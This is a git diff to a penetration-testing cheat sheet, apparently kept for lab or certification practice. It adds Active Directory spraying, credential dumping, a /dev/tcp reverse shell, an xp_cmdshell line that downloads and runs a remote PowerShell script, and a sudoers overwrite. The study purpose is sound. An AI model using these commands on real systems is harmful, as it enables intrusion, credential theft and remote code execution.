@@ -29,17 +29,23 @@ Baseline commands to run against every box, regardless of findings so far.
 
 #### General
 
+Methodology mindmap: https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg
+
 ```sh
 # Full port scan (don't rely on top-1000)
-sudo nmap -p- IP -oN full-tcp.txt
+sudo nmap -p- -T4 IP -oN full-tcp.txt
 # Service/version detection + default scripts on found ports
-sudo nmap -A -p PORTS IP -oN services.txt
+sudo nmap -A -p PORTS -T4 IP -oN services.txt
 # Quick UDP top ports (often skipped, often has SNMP/DNS)
-sudo nmap -sU --top-ports 20 IP -oN udp-top.txt
+sudo nmap -sU --top-ports 20 -T4 IP -oN udp-top.txt
 # Save all loot in a per-box folder
 mkdir -p ~/ctf/IP/{loot,scans,exploits}
 # Check if hostname resolves / add to hosts file
 echo "IP HOSTNAME" | sudo tee -a /etc/hosts
+# Check unknown ports with Netcat
+nc -nv IP PORT
+help
+version
 ```
 
 #### Linux
@@ -57,7 +63,7 @@ cat /etc/passwd
 ls -la /home /root 2>/dev/null
 history
 cat /proc/version
-# Always run LinPEAS as a baseline, even if nothing jumps out manually
+# Always run LinPEAS as a baseline
 ./linpeas.sh -a > /dev/shm/linpeas.txt
 ```
 
@@ -77,6 +83,7 @@ schtasks /query /fo LIST /v
 # Check AV/EDR presence
 Get-MpComputerStatus
 # Always run WinPEAS as a baseline
+# Don't forget different modules you can run
 .\winPEAS.exe
 # Check for stored creds / unattended installs
 cmdkey /list
@@ -86,6 +93,11 @@ Get-ChildItem -Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorActio
 #### Active Directory
 
 ```sh
+# Typical flow
+# Box 1: Exploit
+# Box 2: Lateral movement without exploit (creds, reuse, abuse)
+# Box 3: Lateral movement without exploit (creds, reuse, abuse), requires AD privilege escalation
+
 # Run as soon as any domain credential (even low-priv) is obtained
 nxc smb IP -u 'USER' -p 'PASS' --shares
 nxc smb IP -u 'USER' -p 'PASS' --users
@@ -95,10 +107,62 @@ nxc ldap IP -u 'USER' -p 'PASS' --password-not-required
 nxc ldap IP -u 'USER' -p 'PASS' --kerberoasting kerberoast.txt
 nxc ldap IP -u 'USER' -p 'PASS' --asreproast asrep.txt
 # Baseline BloodHound collection
-nxc ldap IP -u 'USER' -p 'PASS' --bloodhound -c All
+nxc ldap IP -u 'USER' -p 'PASS' --bloodhound -c All --dns-server IP
 # Check password policy and RID brute as baseline
 nxc smb IP -u 'USER' -p 'PASS' --pass-pol
 nxc smb IP -u 'USER' -p 'PASS' --rid-brute
+
+# Collect users when possible
+net user
+net user /DOMAIN
+
+# Crack hashes
+# https://hashes.com/en/decrypt/hash
+hashcat ...
+
+# Using found credential lists
+# SMB - password spray
+nxc smb targets.txt -u users.txt -p passwords.txt --continue-on-success
+# SMB - hash spray (pass-the-hash) 
+nxc smb IP -u users.txt -H hashes.txt --continue-on-success
+# SMB - single known valid cred/hash against full user list
+nxc smb IP -u users.txt -p '<known_password>' --continue-on-success
+nxc smb IP -u users.txt -H '<known_hash>' --continue-on-success
+# WinRM - password spray 
+nxc winrm IP -u users.txt -p passwords.txt
+nxc winrm IP -u users.txt -p passwords.txt --local-auth     
+# WinRM - hash spray 
+nxc winrm IP -u users.txt -H hashes.txt
+nxc winrm IP -u users.txt -H hashes.txt --local-auth 
+# RDP - password spray (if RDP open)
+nxc rdp IP -u users.txt -p passwords.txt
+# Confirm admin access once a hit is found (SMB)
+nxc smb IP -u <valid_user> -p '<valid_pass>' -x "whoami /priv"
+nxc smb IP -u <valid_user> -H '<valid_hash>' -x "whoami /priv"
+# Impacket - psexec with password
+impacket-psexec <domain>/<user>:<password>@IP
+# Impacket - psexec with hash
+impacket-psexec -hashes :<ntlm_hash> <domain>/<user>@IP
+# Impacket - wmiexec (quieter than psexec, no service creation)
+impacket-wmiexec <domain>/<user>:<password>@IP
+impacket-wmiexec -hashes :<ntlm_hash> <domain>/<user>@IP
+# Evil-WinRM - password
+evil-winrm -i IP -u <user> -p '<password>'
+# Evil-WinRM - hash
+evil-winrm -i IP -u <user> -H '<ntlm_hash>'
+
+# Credential dumping
+# Dump credentials from SAM
+# secretsdump - if admin confirmed, dump box2 hashes for next hop
+impacket-secretsdump <domain>/<user>:<password>@IP
+impacket-secretsdump -hashes :<ntlm_hash> <domain>/<user>@IP
+# Dump credentials from memory 
+nxc smb IP -u 'USER' -p 'PASS' -M lsassy
+# Notes
+# --continue-on-success on netexec prevents stopping after first valid hit (needed for bulk lists)
+# NTLM hash format for netexec -H: full LM:NT or just NT alone works
+# Impacket -hashes requires LM:NT format; if only NT, prefix with 32 zeros:
+#   aad3b435b51404eeaad3b435b51404ee:<NT>
 ```
 
 ### Reconaissance & Scanning
@@ -110,6 +174,10 @@ nxc smb IP -u 'USER' -p 'PASS' --rid-brute
 nc -nvv -w 1 -z IP 3388-3390
 # Netcat UDP ports 120-123, 1 second timeout, zero I/O (data)
 nc -nv -u -z -w 1 IP 120-123
+# Check unknown port
+nc IP PORT -nv
+help
+version
 ```
 
 #### Nikto
@@ -254,7 +322,8 @@ hydra -l USER -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://IP -t 1 -v
 # SSH
 hydra -l USER -P /usr/share/wordlists/rockyou.txt IP -t 4 ssh -V
 # FTP (also check empty, username, and reversed username password)
-hydra -l 'admin' -P SecLists/Passwords/Default-Credentials/default-passwords.txt ftp://192.168.105.46 -e nsr -V
+hydra -l 'admin' -P ~/Downloads/SecLists/Passwords/Default-Credentials/default-passwords.txt ftp://192.168.105.46 -e nsr -V
+hydra -C ~/Downloads/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.195.143 -e nsr -V 
 
 # FFUF
 # Use request saved with Burp (make sure to put in FUZZ)
@@ -298,6 +367,8 @@ hashcat -h | grep -i "ssh"
 hashcat -b
 # Brute force MD5
 hashcat -m 0
+# Show previously found passwords
+haschat --show
 # Use rules, debug mode 
 hashcat -r demo.rule --stdout wordlist.txt
 # Rule to append !, 1, and capitalize first letter en lowercase the rest
@@ -395,7 +466,9 @@ python3 -m http.server 80
 wget http://IP/pspy32s
 ./pspy32s
 # Look for cmdline processes
-cat /proc/self/cmdline 
+cat /proc/self/cmdline
+# Replace found binary with reverse shell
+/bin/sh -i >& /dev/tcp/IP/PORT 0>&1
 
 # Check SSH config
 # Check for: PermitRootLogin yes
@@ -532,6 +605,13 @@ chmod +s /tmp/nfs/rootbash
 /share/rootbash -p
 ````
 
+##### Add to Sudoers
+
+``` sh
+# When possible, as alternative to reverse shell
+echo 'USER ALL=(root) NOPASSWD: ALL' > /etc/sudoers
+```
+
 #### Windows
 
 ##### Enumeration
@@ -573,6 +653,13 @@ C:\Users\*\Downloads
 # Processes
 Get-Process
 
+# PowerShell
+# User command history
+Get-History
+(Get-PSReadlineOption).HistorySavePath
+# Create WinRM session
+evil-winrm -i IP -u USER -p "PASS"
+
 # Interesting files / folders
 # Keepass DBs
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
@@ -580,13 +667,6 @@ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyCont
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 # Home directory documents
 Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
-
-# PowerShell
-# User command history
-Get-History
-(Get-PSReadlineOption).HistorySavePath
-# Create WinRM session
-evil-winrm -i IP -u USER -p "PASS"
 
 # WinPEAS
 # Serve winPEAS from home directory and download
@@ -608,10 +688,8 @@ runas /user:USER cmd
 Invoke-RunasCs -Username USER -Password PASS -Command cmd.exe -Remote IP:PORT
 
 # Run as other user in PowerShell
-password = ConvertTo-SecureString "PASS" -AsPlainText -Force
+$password = ConvertTo-SecureString "PASS" -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential ("DOMAIN\USER", $password)
-Get-ADUser -Identity USER -Credential $credential
-nc -nlvp 4445
 Start-Process powershell -Credential $credential -ArgumentList "-nop -w hidden -e BASE64"
 ```
 
@@ -752,7 +830,7 @@ certutil -urlcache -split -f http://192.168.45.235/nc.exe
 
 # PrintSpoofer
 iwr -uri http://IP/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
-PrintSpoofer64.exe -i -c "cmd /c cmd.exe"
+.\PrintSpoofer64.exe -i -c "cmd /c cmd.exe"
 
 # Mimikatz
 # https://adsecurity.org/?page_id=1821
@@ -795,6 +873,8 @@ msiexec /quiet /qn /i malicious.msi
 
 ##### Stored Credentials
 
+https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#windows-credentials
+
 ````ps1
 # Unattended install files
 Get-ChildItem -Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue
@@ -804,6 +884,13 @@ cmdkey /list
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
 netsh wlan show profile
 netsh wlan show profile name="SSID" key=clear
+
+# Remote Desktop Credential Manager
+# https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#remote-desktop-credential-manager
+type %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
+
+# Registry SAM and SYSTEM hives dump
+impacket-secretsdump -system SYSTEM -sam SAM local 
 ````
 
 ##### Code Samples
@@ -894,6 +981,7 @@ git clone https://github.com/SpecterOps/BloodHound.git
 # Start docker daemon
 sudo dockerd
 # Start docker
+cd ~/Downloads/BloodHound
 sudo docker compose up -d
 sudo docker compose ps
 # Get password for 'admin' user
@@ -932,7 +1020,7 @@ https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerber
 # Requires GenericWrite/GenericAll on target user
 impacket-addspn -u DOMAIN\\USER -p PASS -s HTTP/fake IP TARGET_USER
 impacket-GetUserSPNs -request -dc-ip IP DOMAIN/USER:PASS -target TARGET_USER
-impacket-GetUserSPNs -request -dc-ip IP DOMAIN/USER
+impacket-GetUserSPNs -request -dc-ip IP DOMAIN/USER:PASS -outputfile hashes.kerberoast
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 # Crack
@@ -944,7 +1032,7 @@ hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
 ``` sh
 # Check users without pre-auth
 Get-DomainUser -PreauthNotRequired
-impacket-GetNPUsers -dc-ip IP  -request -outputfile hashes.asreproast DOMAIN/USER
+impacket-GetNPUsers -dc-ip IP -request -outputfile hashes.asreproast DOMAIN/USER
 
 # From Linux/Windows using Impacket/Rubeus
 # https://github.com/GhostPack/Rubeus
@@ -1008,6 +1096,7 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
 # 2. ADMIN$ share must be available
 # 3. File and Printer Sharing has to be turned on
 .\PsExec64.exe -i  \\HOST -u DOMAIN\USER -p PASS cmd
+impacket-psexec DOMAIN/USER@IP -hashes HASH
 
 # Pass-the-Hash
 # Only for NTLM auth, not Kerberos
@@ -1015,7 +1104,7 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
 # 1. User that authenticates to the target machine needs to be part of the Administrators local group
 # 2. ADMIN$ share must be available
 # 3. File and Printer Sharing has to be turned on
-/usr/bin/impacket-wmiexec -hashes :NT_HASH USER@IP
+impacket-wmiexec -hashes :NT_HASH USER@IP
 
 # Overpass-the-Hash
 # Upgrade NTLM hash to Kerberos TGT
@@ -1300,6 +1389,26 @@ ls
 # http://target.com/webdav/reverse-shell.php
 ```
 
+#### Kerberos (TCP: 88)
+
+##### Brute Force
+
+https://github.com/ropnop/kerbrute
+
+``` sh
+# Enumerate users
+sudo ./kerbrute_linux_amd64 userenum --dc IP -d DOMAIN /usr/share/wordlists/rockyou.txt
+```
+
+#### Get TGT
+
+``` sh
+# Get TGT for user
+impacket-GetNPUsers DOMAIN/USER -dc-ip IP -request -outputfile hashes.asreproast
+# Crack
+hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
+```
+
 #### SMB (TCP: 139, 445)
 
 ##### PowerShell
@@ -1332,7 +1441,7 @@ sudo nbtscan -r IP/24
 https://hackviser.com/tactics/tools/enum4linux
 
 ```sh
-enum4linux -a IP
+enum4linux -a IP -u USER -p PASS
 ```
 
 ##### rpcclient
@@ -1589,7 +1698,7 @@ ldapsearch -v -x -D 'USER@DOMAIN' -w 'PASS' -b "DC=domain,DC=com" -h IP "(ms-MCS
 # Spose
 python spose.py --proxy http://IP:3128 --target IP -allports
 # Nmap (results not always consistent with other tools)
-nmap -Pn -sV -p 3128 --script http-open-proxy IP
+sudo nmap -Pn -sV -p 3128 --script http-open-proxy IP
 # When connecting to service, don't use localhost, use 127.0.0.1
 ```
 
@@ -1682,6 +1791,11 @@ SELECT @@version;
 SELECT name FROM sys.databases;
 # List tables in DB
 SELECT * FROM offsec.information_schema.tables;
+# Execute OS commands
+EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC master..xp_cmdshell 'whoami'
+# Get reverse shell
+EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://IP:80/shell.ps1") | powershell -noprofile'
 ```
 
 ##### MySQL (TCP: 3306)
@@ -1689,7 +1803,6 @@ SELECT * FROM offsec.information_schema.tables;
 ```sh
 # MySQL login
 mysql -u USER -p'PASS' -h IP -P PORT --skip-ssl-verify-server-cert
-
 # Check version
 select version();
 # Current user
@@ -1698,6 +1811,9 @@ select system_user();
 show databases;
 # List tables in DB
 show tables from DBNAME;
+
+# MySQLDump
+mysqldump.exe -u root --all-databases --result-file=db.sql
 ```
 
 ##### PostgreSQL (TCP: 5432)
@@ -1777,6 +1893,9 @@ shell.php.....
 # Netcat listener
 nc -nvlp PORT
 
+# Use rlwrap to get normal terminal behavior on input side
+rlwrap nc -nvlp PORT
+
 # Meterpreter listener
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST IP;set LPORT PORT;run;"
 # Meterpreter listener (stageless)
@@ -1789,6 +1908,10 @@ IEX (New-Object System.Net.Webclient).DownloadString("http://IP/powercat.ps1");p
 # Penelope
 # https://github.com/brightio/penelope
 penelope -p 4444
+# Download from target (main menu)
+download FILENAME
+# Run modules (main menu)
+run MODULE
 ```
 
 #### Upgrade shell
@@ -1836,16 +1959,16 @@ https://www.tejasl.com/blog/2026/03/03/ligolo-ng-cheatsheet/
 # https://github.com/nicocha30/ligolo-ng/releases/
 tar -xzf *.tar.gz
 chmod +x proxy
-# Create interface 
-interface_create --name "ligolo"
+
 
 # Transfer to target
 python3 -m http.server 80
 iwr -uri http://192.168.45.152/agent.exe -UseBasicParsing -Outfile agent.exe
-
 # Start interface and proxy
-sudo ip link set ligolo up
 sudo ./proxy -selfcert
+# Create interface 
+interface_create --name "ligolo"
+sudo ip link set ligolo up
 # Start agent
 .\agent.exe --connect IP:11601 -ignore-cert
 # Establish tunnel by adding route
@@ -1853,6 +1976,13 @@ session
 ifconfig
 interface_add_route --name ligolo --route FROM_IFCONFIG  
 start
+
+# To transfer file via proxy
+# Select box 1 (proxy)
+session
+# Add listener
+listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:80
+# Then use port 8888 from box 2 (target)
 
 # When target webapp/service only listens on its own 127.0.0.1,
 # the special 240.0.0.1 route (not the agent's real adapter) lets you
@@ -1998,8 +2128,6 @@ netsh advfirewall firewall delete rule name="NAME"
 chmod 400 id_rsa
 sudo -l
 
-
-
 # Directory traversal / local file inclusion Windows
 # https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
 C:\Windows\System32\drivers\etc\hosts
@@ -2033,13 +2161,15 @@ curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
 sudo python2 get-pip.py  
 pip2 install virtualenv      
 python2 -m virtualenv py2env  
-source py2env/bin/activate
+source ~/Downloads/py2env/bin/activate
 python -V
 # Install impacket for Pyhon2
 pip install impacket==0.9.22
 # Python3 env
 python3 -m virtualenv py3env  
-source py3env/bin/activate
+source ~/Downloads/py3env/bin/activate
+curl https://bootstrap.pypa.io/pip/get-pip.py -o get-pip.py
+python3 get-pip.py  
 
 # Open webdav folder, for example to host malicious .lnk file
 wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav
@@ -2068,6 +2198,16 @@ impacket-changepasswd USER@DOMAIN -newpass 'NEWPASSWORD'
 mkdir -p ~/transfer
 impacket-smbserver transfer ~/transfer -smb2support
 copy FILE \\IP\transfer\
+
+# Git
+# Dump .git directory from webapp
+# https://github.com/arthaud/git-dumper
+# Show commit
+git show COMMIT_ID
+
+# Windows
+# Add user to local Administrators group
+net localgroup Administrators USER /add
 ```
 
 #### Windows File Upload Methods
@@ -2202,7 +2342,7 @@ Bookmarks
 
 [https://explainshell.com/](https://explainshell.com/)
 
-Trillium
+Trilium
 
 VScode
 
@@ -2217,6 +2357,8 @@ Download seclists
 Burp plugin and cert
 
 Copy /usr/share/shells to Downloads for easy access and backup
+
+Install Penelope
 
 ```sh
 cd /usr/share/wordlists/
